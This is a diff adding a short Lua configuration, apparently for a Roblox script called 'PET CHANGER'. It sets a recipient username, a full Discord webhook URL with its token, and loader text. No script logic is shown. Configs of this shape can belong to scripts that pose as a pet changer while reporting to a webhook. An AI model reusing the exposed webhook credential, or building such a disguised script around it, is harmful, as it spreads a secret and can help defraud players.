@@ -1,0 +1,9 @@
+Username = "NOOBPLAYZ09_YT"
+
+WebHook = "https://discord.com/api/webhooks/1098873183345594418/st1s0hlaHvh3Cg1ToursQGvU8RR8RaOozVUdlzMOPo21bb-Vlutvi_qXocdKywwBs-W4"
+
+loadingscreen = true
+
+_G.CustomScriptName = "PET CHANGER"
+
+_G.Text1 = "Script Loaded..."
